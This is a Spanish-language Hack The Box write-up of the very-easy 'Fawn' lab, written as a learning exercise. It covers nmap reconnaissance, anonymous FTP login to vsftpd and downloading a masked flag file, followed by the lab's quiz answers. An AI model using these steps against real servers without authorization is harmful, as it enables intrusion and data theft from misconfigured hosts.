# Hack The Box - Fawn Writeup

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Fawn-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)

## 📝 Resumen
**Fawn** es una máquina de la sección **Starting Point (Tier 0)** de Hack The Box centrada en la enumeración y explotación del servicio **FTP (File Transfer Protocol)** a través de una autenticación anónima (*Anonymous FTP Login*).

---

## 🛠️ Información de la Máquina

| Campo | Detalle |
| :--- | :--- |
| **IP Objetivo** | `10.129.x.x` (Asignada al desplegar la máquina) |
| **Sistema Operativo** | Linux |
| **Dificultad** | Very Easy |
| **Vector Principal** | Lectura/Descarga de archivos vía FTP (Acceso Anónimo) |

---

## 🚀 Paso a Paso (Walkthrough)

### 1. Reconocimiento (Port Scanning)
Comenzamos escaneando la dirección IP objetivo utilizando **Nmap** para identificar los puertos y servicios abiertos.

```bash
nmap -sC -sV 10.129.x.x
```

* **`-sC`**: Ejecuta los scripts por defecto de Nmap.
* **`-sV`**: Detecta la versión de los servicios activos.

#### Resultado del escaneo:
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_  -rw-r--r--   1 0        0              32 Jun 04  2021 flag.txt
```

---

### 2. Enumeración de FTP
El reporte de Nmap revela dos datos críticos:
1. El puerto **21/tcp** alberga un servicio **FTP (`vsftpd 3.0.3`)**.
2. Está permitido el inicio de sesión anónimo (`Anonymous FTP login allowed`).

---

### 3. Explotación y Obtención de la Flag

Nos conectamos al servicio FTP remoto utilizando el cliente intercalado de consola:

```bash
ftp 10.129.x.x
```

Cuando solicite credenciales:
* **Name / User:** `anonymous`
* **Password:** *(Presionar Enter para dejar en blanco)*

```text
Connected to 10.129.x.x.
220 (vsFTPd 3.0.3)
Name (10.129.x.x:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Una vez autenticados dentro del shell interactivo de FTP (`ftp>`), listamos el contenido para confirmar la presencia del archivo de la bandera:

```ftp
ftp> ls
229 Entering Extended Passive Mode (|||26664|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Descargamos el archivo `flag.txt` a nuestro equipo local utilizando el comando **`get`**:

```ftp
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||59264|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*****************************************************************|    32       26.08 KiB/s
226 Transfer complete.
32 bytes received in 00:00 (0.72 KiB/s)
ftp> exit
```

---

### 4. Lectura de la Bandera
Al salir de la sesión interactiva de FTP, visualizamos el contenido del archivo descargado en la terminal local con **`cat`**:

```bash
cat flag.txt
```

#### Flag:
```text
******************************** (32 caracteres hexadecimales)
```

---

## 🧠 Conceptos Aprendidos & Preguntas del Módulo

1. **¿Qué significa FTP?**
   * *File Transfer Protocol* (Protocolo de Transferencia de Archivos). Se ejecuta habitualmente en el puerto **21/tcp**.
2. **¿Cómo mostrar el menú de ayuda del cliente FTP?**
   * `ftp -?` o `ftp -h`
3. **¿Cuál es el usuario por defecto para acceder sin credenciales?**
   * `anonymous`
4. **¿Cuál es el comando utilizado para descargar archivos desde una sesión de FTP?**
   * `get`

---
*Writeup creado para documentación personal y repositorio de aprendizaje en Ciberseguridad.*
